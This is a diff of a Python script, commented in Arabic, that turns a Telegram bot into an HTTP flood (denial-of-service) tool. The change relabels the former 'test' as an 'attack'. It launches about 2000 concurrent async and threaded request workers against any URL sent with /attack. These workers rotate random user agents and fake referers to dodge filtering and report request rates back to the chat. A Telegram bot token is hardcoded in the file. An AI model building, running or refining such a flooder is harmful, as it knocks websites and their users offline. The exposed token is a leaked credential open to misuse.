@@ -1,151 +1,181 @@
 import asyncio
 import aiohttp
+import requests
 import random
-import time  # تمت إضافته
+import time
+import socket
 from fake_useragent import UserAgent
 import telebot
-from urllib.parse import urlparse
 from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import urlparse
 
-# إعدادات النظام
-MAX_THREADS = 6000
-REQUEST_TIMEOUT = 30
-MAX_RETRIES = 5
-REPORT_SENT = False  # متغير لتتبع إرسال التقرير
+# إعدادات متوافقة مع 8vCPU و8GB RAM
+MAX_THREADS = 2000  # تم تخفيضها لتحسين الاستقرار
+REQUEST_TIMEOUT = 15
+CONNECTION_LIMIT = 500  # تجنب استنزاف الذاكرة
+KEEPALIVE_TIMEOUT = 20
+REPORT_INTERVAL = 10000
 
 # متغيرات التحكم
-stop_system = False
-ua = UserAgent()
+stop_attack = False
+total_requests = 0
+start_time = time.time()
 
-class AttackManager:
-    def __init__(self, bot, chat_id):
-        self.session = None
-        self.active_tasks = []
+class HybridAttack:
+    def __init__(self, target, bot, chat_id):
+        self.target = target
         self.bot = bot
         self.chat_id = chat_id
-        self.start_time = None
-        self.request_count = 0
-    
-    async def create_session(self):
-        connector = aiohttp.TCPConnector(limit=0, force_close=True)
-        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
-        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
-    
-    async def send_request(self, target):
-        global REPORT_SENT
-        retry_count = 0
-        while not stop_system and retry_count < MAX_RETRIES:
+        self.domain = urlparse(target).netloc
+        self.ip = socket.gethostbyname(self.domain)
+        self.session = None
+        self.ua = UserAgent()
+        
+        # موازنة الحمل بين الطريقتين (60% async - 40% sync)
+        self.async_weight = 0.6
+        self.sync_weight = 0.4
+
+    async def create_async_session(self):
+        """إنشاء جلسة غير متزامنة محسنة"""
+        connector = aiohttp.TCPConnector(
+            limit=CONNECTION_LIMIT,
+            force_close=False,
+            enable_cleanup_closed=True,
+            keepalive_timeout=KEEPALIVE_TIMEOUT
+        )
+        self.session = aiohttp.ClientSession(
+            connector=connector,
+            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
+            trust_env=True
+        )
+
+    def generate_headers(self):
+        """إنشاء رؤوس HTTP عشوائية متقدمة"""
+        return {
+            'User-Agent': self.ua.random,
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Referer': random.choice([
+                'https://www.google.com/',
+                'https://www.facebook.com/',
+                'https://www.youtube.com/'
+            ]),
+            'Cache-Control': 'no-cache'
+        }
+
+    async def async_attack(self):
+        """هجوم غير متزامن (aiohttp)"""
+        global total_requests, stop_attack
+        while not stop_attack:
             try:
-                headers = {
-                    'User-Agent': ua.random,
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.5',
-                    'Connection': 'keep-alive',
-                    'Referer': 'https://www.google.com/',
-                    'Cache-Control': 'no-cache'
-                }
-                
-                async with self.session.get(target, headers=headers) as response:
+                async with self.session.get(
+                    self.target,
+                    headers=self.generate_headers()
+                ) as response:
                     await response.read()
-                    self.request_count += 1
-                    
-                    # إرسال التقرير مرة واحدة فقط بعد 10000 طلب
-                    if self.request_count > 10000 and not REPORT_SENT:
-                        REPORT_SENT = True
-                        duration = int(time.time() - self.start_time)
-                        report = (
-                            f"📊 تقرير أولي:\n"
-                            f"• عدد الطلبات: {self.request_count}\n"
-                            f"• المدة: {duration} ثانية\n"
-                            f"• الحالة: قيد التشغيل"
-                        )
-                        await self.bot.send_message(self.chat_id, report)
-                    
-                    await asyncio.sleep(random.uniform(0.1, 0.3))
-                    
-            except Exception as e:
-                retry_count += 1
-                await asyncio.sleep(1)
-    
-    async def start_attack(self, target, num_threads):
-        self.start_time = time.time()
-        await self.create_session()
-        self.active_tasks = [self.send_request(target) for _ in range(num_threads)]
-        await asyncio.gather(*self.active_tasks)
-    
+                    total_requests += 1
+                    if total_requests % REPORT_INTERVAL == 0:
+                        await self.send_report()
+            except:
+                continue
+
+    def sync_attack(self):
+        """هجوم متزامن (requests)"""
+        global total_requests, stop_attack
+        while not stop_attack:
+            try:
+                requests.get(
+                    self.target,
+                    headers=self.generate_headers(),
+                    timeout=REQUEST_TIMEOUT
+                )
+                total_requests += 1
+                if total_requests % REPORT_INTERVAL == 0:
+                    asyncio.run_coroutine_threadsafe(self.send_report(), asyncio.get_event_loop())
+            except:
+                continue
+
+    async def send_report(self):
+        """إرسال تقرير الأداء"""
+        duration = int(time.time() - start_time)
+        req_rate = int(total_requests / max(1, duration))
+        report = (
+            f"📊 تقرير الهجوم:\n"
+            f"• إجمالي الطلبات: {total_requests}\n"
+            f"• معدل الطلبات/ثانية: {req_rate}\n"
+            f"• المدة: {duration} ثانية\n"
+            f"• الحالة: {'نشط' if not stop_attack else 'متوقف'}"
+        )
+        await self.bot.send_message(self.chat_id, report)
+
+    async def start_hybrid_attack(self):
+        """بدء الهجوم الهجين"""
+        await self.create_async_session()
+        
+        # حساب عدد الخيوط لكل طريقة
+        async_threads = int(MAX_THREADS * self.async_weight)
+        sync_threads = MAX_THREADS - async_threads
+        
+        # بدء الهجوم غير المتزامن
+        async_tasks = [self.async_attack() for _ in range(async_threads)]
+        
+        # بدء الهجوم المتزامن في خيوط منفصلة
+        with ThreadPoolExecutor(max_workers=sync_threads) as executor:
+            sync_tasks = [executor.submit(self.sync_attack) for _ in range(sync_threads)]
+            await asyncio.gather(*async_tasks)
+            
+            # إيقاف المهام المتزامنة عند الطلب
+            for task in sync_tasks:
+                task.cancel()
+
     async def cleanup(self):
+        """تنظيف الموارد"""
         if self.session:
             await self.session.close()
-
-async def run_attack(target, bot, chat_id):
-    manager = AttackManager(bot, chat_id)
-    try:
-        await manager.start_attack(target, MAX_THREADS)
-    except Exception as e:
-        print(f"Error in run_attack: {str(e)}")
-    finally:
-        await manager.cleanup()
-        # إرسال تقرير الإيقاف النهائي
-        if not stop_system:  # إذا توقف بسبب خطأ وليس بأمر /stop
-            duration = int(time.time() - manager.start_time)
-            report = (
-                f"🛑 توقف غير متوقع:\n"
-                f"• إجمالي الطلبات: {manager.request_count}\n"
-                f"• المدة الكلية: {duration} ثانية\n"
-                f"• السبب: خطأ في الاتصال"
-            )
-            await bot.send_message(chat_id, report)
-
-def start_attack_thread(target, bot, chat_id):
-    try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(run_attack(target, bot, chat_id))
-    except Exception as e:
-        print(f"Error in start_attack_thread: {str(e)}")
-    finally:
-        loop.close()
+        await self.send_report()
 
 # إعداد بوت التليجرام
 bot = telebot.TeleBot("7248287448:AAFQcPnXrEaNaIFM-Lx_3VizIiv_9glWXCA")
 
-@bot.message_handler(commands=['start', 'help'])
+@bot.message_handler(commands=['start'])
 def handle_start(message):
-    bot.reply_to(message, "أهلاً! أوامر النظام:\n"
-                         "/attack [رابط] - بدء الاختبار\n"
-                         "/stop - إيقاف الاختبار")
+    bot.reply_to(message, "🛠 نظام الهجوم الهجين المتقدم\n"
+                         "/attack [رابط] - بدء الهجوم\n"
+                         "/stop - إيقاف الهجوم")
 
 @bot.message_handler(commands=['attack'])
 def handle_attack(message):
-    global stop_system, REPORT_SENT
+    global stop_attack, total_requests, start_time
     try:
         target = message.text.split()[1]
         if not target.startswith(('http://', 'https://')):
-            bot.reply_to(message, "يجب أن يبدأ الرابط بـ http:// أو https://")
+            bot.reply_to(message, "⚠ يجب أن يبدأ الرابط بـ http:// أو https://")
             return
         
-        stop_system = False
-        REPORT_SENT = False
-        bot.reply_to(message, f"⚡ بدء الاختبار على {target}...")
+        stop_attack = False
+        total_requests = 0
+        start_time = time.time()
+        
+        bot.reply_to(message, f"🚀 بدء الهجوم الهجين على {target}")
+        attack = HybridAttack(target, bot, message.chat.id)
+        
+        # تشغيل الهجوم في خيط منفصل
         ThreadPoolExecutor(max_workers=1).submit(
-            start_attack_thread, 
-            target, 
-            bot, 
-            message.chat.id
+            lambda: asyncio.run(attack.start_hybrid_attack())
         )
+        
     except IndexError:
-        bot.reply_to(message, "الاستخدام: /attack [رابط الموقع]")
+        bot.reply_to(message, "⚙ الاستخدام: /attack [رابط]")
     except Exception as e:
-        bot.reply_to(message, f"حدث خطأ: {str(e)}")
+        bot.reply_to(message, f"❌ خطأ: {str(e)}")
 
 @bot.message_handler(commands=['stop'])
 def handle_stop(message):
-    global stop_system
-    stop_system = True
-    bot.reply_to(message, "🛑 تم إيقاف الاختبار بنجاح")
+    global stop_attack
+    stop_attack = True
+    bot.reply_to(message, "🛑 تم إيقاف الهجوم بنجاح")
 
 if __name__ == "__main__":
-    try:
-        bot.polling(none_stop=True)
-    except Exception as e:
-        print(f"Error in main: {str(e)}")
+    bot.polling(none_stop=True)
